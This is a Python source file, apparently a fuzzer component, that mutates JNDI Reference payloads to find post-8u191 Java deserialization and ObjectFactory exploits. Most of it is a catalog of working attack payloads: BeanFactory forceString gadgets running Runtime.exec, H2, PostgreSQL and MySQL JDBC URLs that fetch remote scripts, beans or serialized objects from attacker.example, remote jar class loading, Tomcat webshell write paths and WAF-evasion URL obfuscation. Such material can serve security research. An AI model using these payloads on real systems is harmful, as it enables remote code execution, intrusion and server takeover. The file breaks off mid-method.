"""JNDI ObjectFactory abuse mutator for post-8u191 exploitation discovery.

Taxonomy-driven mutation targeting ObjectFactory implementations on classpath:
  J1  Factory class mutation       → swap between known and discovered factories
  J2  Reference attribute mutation → forceString, bean properties, JDBC URLs
  J3  Sink expression mutation     → EL, JShell, Groovy, SnakeYAML, MVEL, BSH
  J4  Protocol/URL mutation        → LDAP/RMI/DNS/IIOP, obfuscation, encoding
  J5  JDBC driver exploitation     → H2, HSQLDB, PostgreSQL, MySQL, Databricks
  J6  Constraint repair            → fix inconsistent factory-sink pairings
  J7  Exception-guided mutation    → parse target feedback, apply targeted fix

Operates on JNDI Reference IR JSON.  Each factory class has associated
attribute templates and compatible sink types.  The mutator maintains a
learned database of factories from ObjectFactoryScanner static analysis.
"""

from __future__ import annotations

import copy
import json
import logging
import os
import random
from typing import TYPE_CHECKING, Any

from ..protocols import Input

if TYPE_CHECKING:
    from ..corpus import Seed

logger = logging.getLogger(__name__)

MAX_OUTPUT_SIZE = 16384

# ---------------------------------------------------------------------------
# Factory database: factory class → compatible configurations
# ---------------------------------------------------------------------------

# Known ObjectFactory exploit patterns from taxonomy (§2 ObjectFactory Abuse)
FACTORY_DATABASE: dict[str, dict[str, Any]] = {
    # ── Tomcat BeanFactory (universal post-8u191 vector) ──────────
    "org.apache.naming.factory.BeanFactory": {
        "pattern": "bean_factory_reflection",
        "compatible_sinks": [
            "el_eval", "jshell_eval", "groovy_eval", "yaml_load",
            "bsh_eval", "xstream_deser",
            # mvel_exec removed: ShellSession reads stdin, blocks JVM permanently
            "mlet_classload", "groovy_classload", "native_lib_load",
            "velocity_mkdir",
        ],
        "reference_classes": {
            "el_eval": ["javax.el.ELProcessor", "jakarta.el.ELProcessor"],
            "jshell_eval": ["jdk.jshell.JShell"],
            "groovy_eval": ["groovy.lang.GroovyShell"],
            "yaml_load": ["org.yaml.snakeyaml.Yaml"],
            # mvel_exec removed (ShellSession blocks stdin)
            "bsh_eval": ["bsh.Interpreter"],
            "xstream_deser": ["com.thoughtworks.xstream.XStream"],
            # URLClassLoader-based class loading (rogue-jndi / b1ue.cn)
            "mlet_classload": ["javax.management.loading.MLet"],
            "groovy_classload": ["groovy.lang.GroovyClassLoader"],
            # Native library loading (JavaFX)
            "native_lib_load": ["com.sun.glass.utils.NativeLibLoader"],
            # Velocity FileUtil mkdir (srcincite MemoryUserDB RCE pre-req)
            "velocity_mkdir": ["org.apache.velocity.texen.util.FileUtil"],
        },
        "forcestring_methods": {
            "el_eval": "eval",
            "jshell_eval": "eval",
            "groovy_eval": "evaluate",
            "yaml_load": "load",
            # mvel_exec removed (ShellSession blocks stdin)
            "bsh_eval": "eval",
            "xstream_deser": "fromXML",
            # Multi-step forceString: a=method1,b=method2
            "mlet_classload": "addURL",  # step1=addURL, step2=loadClass
            "groovy_classload": "addClasspath",  # step1=addClasspath, step2=loadClass
            "native_lib_load": "loadLibrary",
            "velocity_mkdir": "mkdir",
        },
    },
    # ── MemoryUserDatabaseFactory (Tomcat file write / path RCE) ──
    "org.apache.catalina.users.MemoryUserDatabaseFactory": {
        "pattern": "file_write",
        "compatible_sinks": ["file_write", "file_write_rce"],
        "reference_class": "org.apache.catalina.UserDatabase",
        "attrs_template": {
            "pathname": "../../webapps/ROOT/shell.jsp",
            "readonly": "false",
        },
    },
    # ── Tomcat DBCP2 BasicDataSourceFactory ───────────────────────
    "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": [
            "jdbc_h2_runscript", "jdbc_hsqldb_call",
            "jdbc_pgsql_socketfactory", "jdbc_mysql_deser",
        ],
    },
    # ── Tomcat JDBC Pool DataSourceFactory ────────────────────────
    "org.apache.tomcat.jdbc.pool.DataSourceFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": [
            "jdbc_h2_runscript", "jdbc_hsqldb_call",
            "jdbc_pgsql_socketfactory", "jdbc_mysql_deser",
        ],
        "extra_attrs": {"initSQL": True},
    },
    # ── Apache Commons DBCP2 ──────────────────────────────────────
    "org.apache.commons.dbcp2.BasicDataSourceFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": [
            "jdbc_h2_runscript", "jdbc_hsqldb_call",
            "jdbc_pgsql_socketfactory", "jdbc_mysql_deser",
        ],
    },
    # ── Alibaba Druid ─────────────────────────────────────────────
    "com.alibaba.druid.pool.DruidDataSourceFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": [
            "jdbc_h2_runscript", "jdbc_hsqldb_call",
            "jdbc_pgsql_socketfactory", "jdbc_mysql_deser",
        ],
        "url_attr": "url",
        "extra_attrs": {"init": "true", "connectionInitSqls": True},
    },
    # ── HikariCP ──────────────────────────────────────────────────
    "com.zaxxer.hikari.HikariJNDIFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": [
            "jdbc_h2_runscript", "jdbc_hsqldb_call",
            "jdbc_pgsql_socketfactory", "jdbc_mysql_deser",
        ],
        "url_attr": "jdbcUrl",
        "attrs_template": {"username": "sa", "password": ""},
        "extra_attrs": {"connectionInitSql": True},
    },
    # ── C3P0 JndiRefForwardingDataSource ──────────────────────────
    # REMOVED: package-private class, JavaBeanObjectFactory cannot instantiate
    # ── C3P0 WrapperConnectionPoolDataSource ────────────────────
    # REMOVED as standalone factory: not an ObjectFactory. Moved to
    # JavaBeanObjectFactory reference_classes below.
    # ── C3P0 JavaBeanObjectFactory (BeanFactory equivalent) ─────
    "com.mchange.v2.naming.JavaBeanObjectFactory": {
        "pattern": "bean_reflection",
        "compatible_sinks": [
            "el_exec", "groovy_exec", "bsh_eval",
            # mvel_exec removed: ShellSession blocks stdin
            "network", "jndi_relookup",  # C3P0 DataSource beans trigger network
        ],
        "reference_classes": {
            # BeanFactory-style sinks (expression evaluation)
            "el_exec": ["javax.el.ELProcessor"],
            "groovy_exec": ["groovy.lang.GroovyShell"],
            "bsh_eval": ["bsh.Interpreter"],
            # C3P0 DataSource beans (network/JNDI re-lookup)
            "network": [
                "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource",
                "com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource",
            ],
            "jndi_relookup": [
                "com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource",
            ],
        },
        "c3p0_attrs": {
            "com.mchange.v2.c3p0.WrapperConnectionPoolDataSource": {
                "userOverridesAsString": "",  # hex-encoded serialized object
            },
            "com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource": {
                # empty attrs triggers network on construction
                # jndiName NPEs through PropertyEditor, skip it
            },
        },
    },
    # ── WebSphere ClientJ2CCFFactory (classpath manipulation) ─────
    "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory": {
        "pattern": "websphere_specific",
        "compatible_sinks": ["class_load", "jndi_relookup"],
    },
    # ── WebSphere ServiceFactory (XXE via WSDL — rogue-jndi) ───
    "com.ibm.ws.webservices.engine.client.ServiceFactory": {
        "pattern": "websphere_xxe",
        "compatible_sinks": ["xxe_oob"],
        "attrs_template": {
            "wsdlURL": "http://attacker.example/xxe.wsdl",
        },
    },
    # ── DBCP2 SharedPoolDataSource (binary deser — b1ue.cn) ────
    "org.apache.commons.dbcp2.datasources.SharedPoolDataSourceFactory": {
        "pattern": "dbcp_deser",
        "compatible_sinks": ["binary_deser"],
        "reference_class": "org.apache.commons.dbcp2.datasources.SharedPoolDataSource",
        "attrs_template": {
            "dataSourceName": "ldap://attacker.example:1389/exploit",
        },
    },
    # ── Spring MethodInvokingFactoryBean ──────────────────────────
    "org.springframework.beans.factory.config.MethodInvokingFactoryBean": {
        "pattern": "spring_method_invoke",
        "compatible_sinks": ["cmd_exec", "reflection_invoke"],
    },
    # ── H2 JdbcDataSourceFactory (direct, no connection pool) ────
    "org.h2.jdbcx.JdbcDataSourceFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": ["jdbc_h2_runscript", "jdbc_h2_alias"],
        "reference_class": "org.h2.jdbcx.JdbcDataSource",
        "url_attr": "url",
        "driver_attr": None,
        "attrs_template": {
            "user": "sa",
            "password": "",
            "description": "",
            "loginTimeout": "0",
        },
    },
    # ── HSQLDB JDBCDataSourceFactory ─────────────────────────────
    "org.hsqldb.jdbc.JDBCDataSourceFactory": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": ["jdbc_hsqldb_call"],
        "reference_class": "org.hsqldb.jdbc.JDBCDataSource",
        "url_attr": "database",
        "driver_attr": None,
        "attrs_template": {"user": "sa", "password": ""},
    },
    # ── Apache Derby ────────────────────────────────────────────
    # NOTE: Derby 10.15+ removed EmbeddedDataSource40 class.
    # Derby's JNDI abuse value is low (file export only, no RCE).
    # Kept as comment for reference, not active in mutation.
    # "org.apache.derby.jdbc.EmbeddedDataSource40": { ... }
    # ── WebLogic WLInitialContextFactory (legacy alias) ─────────────
    "weblogic.jndi.WLInitialContextFactory": {
        "pattern": "weblogic_url_context",
        "compatible_sinks": ["network", "jndi_relookup"],
        "reference_class": "javax.naming.Context",
        "attrs_template": {
            "java.naming.provider.url": "t3://attacker.example:7001",
            "java.naming.factory.initial": "weblogic.jndi.WLInitialContextFactory",
        },
    },
    # ── WebLogic T3 URLContextFactory (network connect) ────────────
    "weblogic.jndi.factories.t3.t3URLContextFactory": {
        "pattern": "weblogic_url_context",
        "compatible_sinks": ["network", "jndi_relookup"],
    },
    # ── WebLogic HTTP URLContextFactory (network connect) ─────────
    "weblogic.jndi.factories.http.httpURLContextFactory": {
        "pattern": "weblogic_url_context",
        "compatible_sinks": ["network"],
    },
    # ── WebLogic IIOP ObjectFactory (CORBA/IIOP) ──────────────────
    "weblogic.iiop.jndi.IiopObjectFactory": {
        "pattern": "weblogic_iiop",
        "compatible_sinks": ["network", "jndi_relookup"],
    },
    # ── WebLogic ProxyDataSourceManager (JDBC proxy) ──────────────
    "weblogic.jdbc.common.internal.ProxyDataSourceManager": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": ["jdbc_h2_runscript", "jdbc_hsqldb_call"],
    },
    # ── WebLogic UCPDataSourceManager (UCP pool) ──────────────────
    "weblogic.jdbc.common.internal.UCPDataSourceManager": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": ["jdbc_h2_runscript"],
    },
    # ── WebLogic MailSessionObjectFactory (JavaMail SSRF) ─────────
    "weblogic.deployment.MailSessionObjectFactory": {
        "pattern": "weblogic_mail",
        "compatible_sinks": ["network"],
        "attrs_template": {
            "mail.smtp.host": "attacker.example",
            "mail.smtp.port": "25",
        },
    },
    # ── WebLogic URLObjectFactory (URL resolution) ────────────────
    "weblogic.application.naming.URLObjectFactory": {
        "pattern": "weblogic_url",
        "compatible_sinks": ["network", "jndi_relookup"],
    },
    # ── WebLogic javaURLContextFactory ────────────────────────────
    "weblogic.jndi.factories.java.javaURLContextFactory": {
        "pattern": "weblogic_java_context",
        "compatible_sinks": ["jndi_relookup"],
    },
    # ── Kodo JDO PersistenceManagerFactory ─────────────────────────
    "kodo.jdo.PersistenceManagerFactoryImpl": {
        "pattern": "datasource_jdbc",
        "compatible_sinks": ["jdbc_h2_runscript"],
    },
    # ── BEA Spring JndiObjectFactoryBean (JNDI re-lookup) ────────
    "com.bea.core.repackaged.springframework.jndi.JndiObjectFactoryBean": {
        "pattern": "spring_jndi_relookup",
        "compatible_sinks": ["jndi_relookup"],
        "reference_class": "java.lang.Object",
        "attrs_template": {
            "jndiName": "ldap://attacker.example:1389/exploit",
            "resourceRef": "false",
        },
    },
}

# Factory classes list (for random selection)
_FACTORY_CLASSES: list[str] = list(FACTORY_DATABASE.keys())

_PATTERN_REFERENCE_CLASSES: dict[str, str] = {
    "datasource_jdbc": "javax.sql.DataSource",
    "file_write": "org.apache.catalina.UserDatabase",
    "weblogic_url_context": "javax.naming.Context",
    "weblogic_iiop": "javax.naming.Context",
    "weblogic_java_context": "javax.naming.Context",
    "spring_jndi_relookup": "java.lang.Object",
}

# ---------------------------------------------------------------------------
# JDBC exploitation database (§4 JDBC Connection Exploitation)
# ---------------------------------------------------------------------------

JDBC_EXPLOITS: dict[str, dict[str, Any]] = {
    "jdbc_h2_runscript": {
        "driver": "org.h2.Driver",
        "urls": [
            "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
            "jdbc:h2:mem:test;INIT=CREATE ALIAS EXEC AS 'String e(String c) throws Exception {Runtime.getRuntime().exec(c);return null;}';CALL EXEC('id')",
            "jdbc:h2:mem:test;INIT=CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws Exception { Runtime rt= Runtime.getRuntime(); String[] commands = cmd.split(\" \"); Process proc = rt.exec(commands); return null; }$$;CALL SHELLEXEC('id')",
            "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://attacker.example/rce.sql'",
        ],
    },
    "jdbc_hsqldb_call": {
        "driver": "org.hsqldb.jdbc.JDBCDriver",
        "urls": [
            "jdbc:hsqldb:mem:test",
            "jdbc:hsqldb:http://attacker.example/db",
        ],
        "init_sqls": [
            "CALL \"java.lang.Runtime\".exec('id')",
            "CALL \"java.lang.System\".setProperty('com.sun.jndi.ldap.object.trustURLCodebase','true')",
            "CALL \"java.lang.Thread\".sleep(5000)",
        ],
    },
    "jdbc_pgsql_socketfactory": {
        "driver": "org.postgresql.Driver",
        "urls": [
            "jdbc:postgresql://attacker.example/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.example/bean.xml",
            "jdbc:postgresql://attacker.example/test?socketFactory=com.sun.rowset.JdbcRowSetImpl&socketFactoryArg=ldap://attacker.example/exploit",
            "jdbc:postgresql://attacker.example/test?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&sslfactoryarg=http://attacker.example/bean.xml",
            "jdbc:postgresql://localhost/test?loggerLevel=DEBUG&loggerFile=/tmp/pwned",
        ],
    },
    "jdbc_mysql_deser": {
        "driver": "com.mysql.cj.jdbc.Driver",
        "urls": [
            "jdbc:mysql://attacker.example/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
            "jdbc:mysql://attacker.example/test?autoDeserialize=true&allowLoadLocalInfile=true",
            "jdbc:mysql://attacker.example/test?allowUrlInLocalInfile=true",
            "jdbc:mysql://attacker.example/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&DBNAME=test",
        ],
        "alt_drivers": ["com.mysql.jdbc.Driver"],
    },
    # jdbc_derby removed: Derby 10.15+ removed EmbeddedDataSource40; low exploit value
    "jdbc_databricks_jaas": {
        "driver": "com.databricks.client.jdbc.Driver",
        "urls": [
            "jdbc:databricks://host;krbJAASFile=/dev/stdin",
            "jdbc:databricks://host;krbJAASFile=http://attacker.example/jaas.conf",
        ],
    },
}

# ---------------------------------------------------------------------------
# Expression payload database (§2 BeanFactory sinks)
# ---------------------------------------------------------------------------

EL_PAYLOADS: list[str] = [
    # javax.el.ELProcessor.eval()
    "Runtime.getRuntime().exec('id')",
    "''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
    "T(java.lang.Runtime).getRuntime().exec('id')",
    "new java.lang.ProcessBuilder(new String[]{'id'}).start()",
    "''.getClass().forName('java.lang.Runtime').getRuntime().exec(new String[]{'/bin/sh','-c','id'})",
    # Evasion variants
    "Runtime.getRuntime().exec(new String[]{\"sh\",\"-c\",\"id\"})",
    "''.getClass().forName('java.lang.Proc'+'essBuilder').getDeclaredConstructors()[0].newInstance(new String[]{'id'}).start()",
]

JSHELL_PAYLOADS: list[str] = [
    "Runtime.getRuntime().exec(\"id\")",
    "new ProcessBuilder(\"id\").start()",
    "var r=Runtime.getRuntime();r.exec(\"id\")",
    "var pb=new ProcessBuilder(List.of(\"id\"));pb.start()",
    "Thread.sleep(5000)",  # timing oracle
]

GROOVY_PAYLOADS: list[str] = [
    "'id'.execute()",
    "new ProcessBuilder(['id']).start()",
    "['id'].execute()",
    "Runtime.getRuntime().exec('id')",
    "\"touch /tmp/pwned\".execute()",
]

YAML_PAYLOADS: list[str] = [
    "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://attacker.example/exploit']]]]",
    "!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: 'ldap://attacker.example/exploit', autoCommit: true}",
]

MVEL_PAYLOADS: list[str] = [
    "Runtime.getRuntime().exec('id')",
    "new java.lang.ProcessBuilder(new String[]{'id'}).start()",
]

BSH_PAYLOADS: list[str] = [
    "exec(\"id\")",
    "Runtime.getRuntime().exec(\"id\")",
    "new ProcessBuilder(\"id\").start()",
]

XSTREAM_PAYLOADS: list[str] = [
    "<java.util.PriorityQueue><comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'></comparator></java.util.PriorityQueue>",
]

MLET_PAYLOADS: list[str] = [
    # MLet: addURL then loadClass — needs two-step forceString
    "http://attacker.example/malicious.jar",
    "http://attacker.example/exploit.jar",
    "file:///tmp/evil.jar",
]

GROOVY_CLASSLOAD_PAYLOADS: list[str] = [
    # GroovyClassLoader: addClasspath then loadClass — AST transform RCE
    "http://attacker.example/malicious.jar",
    "http://attacker.example/ast_transform.jar",
]

NATIVE_LIB_PAYLOADS: list[str] = [
    # NativeLibLoader: load attacker-controlled .so/.dll
    "/tmp/evil",
    "\\\\attacker.example\\share\\evil",
    "/dev/shm/pwned",
]

VELOCITY_MKDIR_PAYLOADS: list[str] = [
    # Velocity FileUtil.mkdir() — pre-requisite for MemoryUserDB path RCE
    "http:/127.0.0.1:1337/",
    "http:/attacker.example/",
]

_SINK_TO_PAYLOADS: dict[str, list[str]] = {
    "el_eval": EL_PAYLOADS,
    "jshell_eval": JSHELL_PAYLOADS,
    "groovy_eval": GROOVY_PAYLOADS,
    "yaml_load": YAML_PAYLOADS,
    "mvel_exec": MVEL_PAYLOADS,
    "bsh_eval": BSH_PAYLOADS,
    "xstream_deser": XSTREAM_PAYLOADS,
    "mlet_classload": MLET_PAYLOADS,
    "groovy_classload": GROOVY_CLASSLOAD_PAYLOADS,
    "native_lib_load": NATIVE_LIB_PAYLOADS,
    "velocity_mkdir": VELOCITY_MKDIR_PAYLOADS,
}

# ---------------------------------------------------------------------------
# Lookup URL obfuscation (§6 WAF/IDS Evasion)
# ---------------------------------------------------------------------------

PROTOCOLS: list[str] = ["ldap", "ldaps", "rmi", "dns", "iiop"]

_URL_OBFUSCATION_TEMPLATES: list[str] = [
    "{proto}://attacker.example:1389/exploit",
    "{proto}://attacker.example/{random}",
    "{proto}://127.0.0.1#attacker.example/exploit",  # fragment confusion
    "{proto}://[::1]/exploit",  # IPv6
    "{proto}://0x7f000001/exploit",  # hex IP
    "{proto}://2130706433/exploit",  # decimal IP
    "{proto}://attacker.example:1389/exploit?{random}",
    "{PROTO}://attacker.example:1389/exploit",  # case variation
]

# File write paths for MemoryUserDatabaseFactory
FILE_WRITE_PATHS: list[str] = [
    # Basic file write
    "../../webapps/ROOT/shell.jsp",
    "/tmp/pwned",
    "conf/tomcat-users.xml",
    "../../conf/server.xml",
    "../webapps/manager/WEB-INF/web.xml",
    "webapps/ROOT/test.txt",
    # srcincite path traversal RCE via http:// pathname (MemoryUserDatabaseFactory)
    "http://attacker.example/../../../../webapps/ROOT/poc.jsp",
    "http://127.0.0.1:1337/../../../../webapps/ROOT/shell.jsp",
    "http://attacker.example/../../webapps/ROOT/cmd.jsp",
    # Tomcat conf overwrite
    "http://attacker.example/../../../../conf/tomcat-users.xml",
    "http://attacker.example/../../../../conf/context.xml",
]

# ---------------------------------------------------------------------------
# Strategy weights
# ---------------------------------------------------------------------------

_STRATEGY_DEFS: list[tuple[str, float]] = [
    # J1: Factory class mutation
    ("factory_swap",         0.15),
    ("factory_discover",     0.08),  # use scanner-discovered factories
    # J2: Reference attribute mutation
    ("attr_inject",          0.12),
    ("forcestring_mutate",   0.10),
    ("attr_havoc",           0.05),
    # J3: Sink expression mutation
    ("sink_payload_swap",    0.12),
    ("sink_type_swap",       0.08),
    ("sink_obfuscate",       0.05),
    # J4: Protocol/URL mutation
    ("protocol_swap",        0.06),
    ("url_obfuscate",        0.04),
    # J5: JDBC driver exploitation
    ("jdbc_url_swap",        0.10),
    ("jdbc_driver_swap",     0.05),
    ("jdbc_param_inject",    0.05),
    # J6: Constraint repair
    ("consistency_fix",      0.08),
    # J7: Exception-guided
    ("exception_guided",     0.10),
    # J8: Method introspection — use runtime reflection feedback
    ("method_introspect",    0.10),
    # J9: Replay successful — mutate payloads on chains that reached sinks
    ("replay_successful",    0.06),
]

# ---------------------------------------------------------------------------
# Minimal valid IR
# ---------------------------------------------------------------------------

_MINIMAL_IR: dict[str, Any] = {
    "attack_type": "jndi_factory",
    "factory_class": "org.apache.naming.factory.BeanFactory",
    "reference_class": "javax.el.ELProcessor",
    "factory_attrs": {
        "forceString": "x=eval",
        "x": "Runtime.getRuntime().exec('id')",
    },
    "sink_type": "el_eval",
    "protocol": "ldap",
    "lookup_url": "ldap://attacker.example:1389/exploit",
}


def _parse_ir(data: bytes) -> dict[str, Any] | None:
    try:
        obj = json.loads(data)
        if isinstance(obj, dict) and obj.get("attack_type") == "jndi_factory":
            return obj
    except (json.JSONDecodeError, UnicodeDecodeError, ValueError, RecursionError):
        pass
    return None


def _serialize_ir(ir: dict[str, Any]) -> bytes:
    return json.dumps(ir, separators=(",", ":"), ensure_ascii=True).encode("utf-8")


class JndiMutator:
    """JNDI ObjectFactory abuse mutator for post-8u191 exploitation discovery."""

    name = "jndi"

    def __init__(self, seed: int | None = None) -> None:
        self.rng = random.Random(seed)

        self._strategy_names: list[str] = [name for name, _ in _STRATEGY_DEFS]
        self._strategy_methods = [
            getattr(self, f"_{name}") for name, _ in _STRATEGY_DEFS
        ]
        self._base_weights: list[int] = [
            max(1, int(w * 100)) for _, w in _STRATEGY_DEFS
        ]
        self._weights: list[int] = list(self._base_weights)
        self._strategy_finds: list[int] = [0] * len(self._strategy_methods)
        self._strategy_cov: list[int] = [0] * len(self._strategy_methods)
        self._total_feedback_calls: int = 0
        self._last_exception_hint: dict[str, Any] | None = None

        # ── Runtime method introspection cache ─────────────────────
        # Populated from JndiTarget's reflection feedback (string_methods).
        # Maps reference_class → list of typed method info dicts.
        # Each dict: {"name": str, "return_type": str}
        # e.g. {"name": "addURL", "return_type": "void"}
        self._introspected_methods: dict[str, list[dict[str, str]]] = {}

        # ── Phase 1: Classpath availability cache ─────────────────
        # Negative cache: classes confirmed missing from classpath.
        # Positive caches: factories/refs confirmed present.
        self._unavailable_classes: set[str] = set()
        self._available_factories: set[str] = set()
        self._valid_ref_classes: set[str] = set()

        # ── Phase 2: Sink reachability map ────────────────────────
        # Records which (factory, ref_class, method) triples reached sinks.
        # Key: (factory_class, reference_class, method_invoked)
        # Value: {"sinks": set[str], "count": int}
        self._reachability_map: dict[tuple[str, str, str], dict[str, Any]] = {}

        # ── Phase 3: Factory probe warmup ─────────────────────────
        # Probe each known factory once at session start to learn
        # classpath availability without wasting real mutations.
        self._factory_probe_queue: list[str] = list(FACTORY_DATABASE.keys())
        self.rng.shuffle(self._factory_probe_queue)

        # ── Phase 4: JDBC driver availability ─────────────────────
        self._available_drivers: set[str] = set()

        # ── Phase 6: Classpath sweep ──────────────────────────────
        # Send once at session start; results populate _introspected_methods
        # and _valid_ref_classes automatically.
        self._sweep_pending: bool = True
        self._swept_classes: list[str] = []  # classes from sweep

        # Load scanner-discovered factories if available
        self._discovered_factories: dict[str, dict[str, Any]] = {}
        self._load_discovered_factories()

    def _load_discovered_factories(self) -> None:
        """Load factory catalog from ObjectFactoryScanner output."""
        catalog_path = os.path.join(
            os.path.dirname(__file__), "..", "..", "..",
            "targets", "deser_seeds", "iocd", "factory_catalog.json",
        )
        if not os.path.exists(catalog_path):
            return
        try:
            with open(catalog_path) as f:
                catalog = json.load(f)
            for entry in catalog:
                if isinstance(entry, dict) and entry.get("riskScore", 0) >= 20:
                    cls = entry.get("factoryClass", "")
                    if cls and cls not in FACTORY_DATABASE:
                        self._discovered_factories[cls] = entry
            if self._discovered_factories:
                logger.info(
                    "JNDI: loaded %d discovered factories from scanner",
                    len(self._discovered_factories),
                )
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Mutator protocol
    # ------------------------------------------------------------------

    def mutate(self, inp: Input, corpus: list[Seed]) -> Input:
        # ── Phase 6: Classpath sweep (first call only) ────────────
        # Send a sweep command to discover all viable reference classes.
        if self._sweep_pending:
            self._sweep_pending = False
            sweep_ir = {"attack_type": "sweep_classpath"}
            data = _serialize_ir(sweep_ir)
            return Input(
                data=data,
                metadata={
                    **inp.metadata,
                    "mutator": self.name,
                    "strategy": "classpath_sweep",
                },
            )

        # ── Phase 3: Factory probe warmup ─────────────────────────
        # On first N calls, send probe inputs to discover classpath
        # availability instead of wasting real mutations.
        if self._factory_probe_queue:
            factory_cls = self._factory_probe_queue.pop()
            probe_ir = {
                "attack_type": "jndi_factory",
                "factory_class": factory_cls,
                "reference_class": "java.lang.Object",
                "sink_type": "probe",
                "factory_attrs": {"forceString": "x=toString", "x": ""},
            }
            data = _serialize_ir(probe_ir)
            return Input(
                data=data,
                metadata={
                    **inp.metadata,
                    "mutator": self.name,
                    "strategy": "factory_probe",
                },
            )

        ir = _parse_ir(inp.data)
        if ir is None:
            ir = copy.deepcopy(_MINIMAL_IR)

        applied: list[str] = []

        n_mutations = self.rng.choices([1, 2, 3], weights=[50, 35, 15], k=1)[0]
        for _ in range(n_mutations):
            idx = self.rng.choices(
                range(len(self._strategy_methods)),
                weights=self._weights,
                k=1,
            )[0]
            result = self._strategy_methods[idx](ir, corpus)
            if result is not None:
                out = _serialize_ir(result)
                if len(out) <= MAX_OUTPUT_SIZE:
                    ir = result
                    applied.append(self._strategy_names[idx])
                    continue

            # Fallback
            fallback_idx = self.rng.randrange(len(self._strategy_methods))
            result = self._strategy_methods[fallback_idx](ir, corpus)
            if result is not None:
                out = _serialize_ir(result)
                if len(out) <= MAX_OUTPUT_SIZE:
                    ir = result
                    applied.append(self._strategy_names[fallback_idx])

        self._normalize_ir_contract(ir)
        data = _serialize_ir(ir)
        return Input(
            data=data[:MAX_OUTPUT_SIZE],
            metadata={
                **inp.metadata,
                "mutator": self.name,
                "strategies": applied,
                "factory_class": ir.get("factory_class", ""),
                "sink_type": ir.get("sink_type", ""),
            },
        )

    # ------------------------------------------------------------------
    # Adaptive feedback
    # ------------------------------------------------------------------

    def feedback(self, strategy_name: str, signal: str) -> None:
        try:
            idx = self._strategy_names.index(strategy_name)
        except ValueError:
            return

        self._total_feedback_calls += 1

        if signal == "finding":
            self._strategy_finds[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 4, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "stage_up":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] * 15 // 100, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "coverage":
            self._strategy_cov[idx] += 1
            self._weights[idx] = min(
                self._weights[idx] + max(self._base_weights[idx] // 10, 1),
                self._base_weights[idx] * 3,
            )
        elif signal == "timeout":
            penalty = max(self._base_weights[idx] // 3, 1)
            if self._strategy_names[idx] == "exception_guided":
                penalty = max(self._base_weights[idx] // 2, 1)
            self._weights[idx] = max(self._weights[idx] - penalty, 1)

        if self._total_feedback_calls % 1000 == 0:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0 and self._strategy_cov[i] == 0:
                    self._weights[i] = max(self._weights[i] - 1, 1)

    def reset_weights(self, boost_zero_finds: bool = False) -> None:
        if boost_zero_finds:
            for i in range(len(self._strategy_methods)):
                if self._strategy_finds[i] == 0:
                    self._weights[i] = min(
                        self._base_weights[i] + max(self._base_weights[i] // 3, 1),
                        self._base_weights[i] * 2,
                    )
                else:
                    self._weights[i] = self._base_weights[i]
        else:
            self._weights = list(self._base_weights)

    def set_exception_hint(self, hint: dict[str, Any] | None) -> None:
        self._last_exception_hint = hint
        if not hint:
            return

        # ── Phase 6: Classpath sweep results ──────────────────────
        sweep_results = hint.get("sweep_results")
        if isinstance(sweep_results, list) and sweep_results:
            for entry in sweep_results:
                cls = entry.get("class", "")
                methods_raw = entry.get("methods", [])
                if not cls or not methods_raw:
                    continue
                self._valid_ref_classes.add(cls)
                self._swept_classes.append(cls)
                if cls not in self._introspected_methods:
                    parsed: list[dict[str, str]] = []
                    for m in methods_raw:
                        if isinstance(m, str) and ":" in m:
                            name, ret = m.split(":", 1)
                            parsed.append({"name": name, "return_type": ret})
                    if parsed:
                        self._introspected_methods[cls] = parsed
            logger.info(
                "JNDI: classpath sweep → %d viable ref classes, %d with methods",
                len(self._swept_classes),
                len([c for c in self._swept_classes if c in self._introspected_methods]),
            )
            return  # Sweep response has no other fields

        factory_class = hint.get("factory_class", "")
        ref_class = hint.get("reference_class", "")
        error_type = hint.get("error_type", "")

        # ── Phase 1: Classpath availability cache ─────────────────
        if error_type == "class_not_found":
            error_msg = hint.get("error_message", "")
            # Extract the missing class name from the error message
            if factory_class and not hint.get("factory_loaded", True):
                self._unavailable_classes.add(factory_class)
            elif ref_class:
                self._unavailable_classes.add(ref_class)
        if hint.get("factory_loaded"):
            if factory_class:
                self._available_factories.add(factory_class)
        if hint.get("has_no_arg_ctor"):
            if ref_class:
                self._valid_ref_classes.add(ref_class)

        # ── Phase 2: Sink reachability feedback ───────────────────
        sinks_hit = hint.get("sinks_hit")
        method_invoked = hint.get("method_invoked", "")
        if isinstance(sinks_hit, list) and sinks_hit and factory_class:
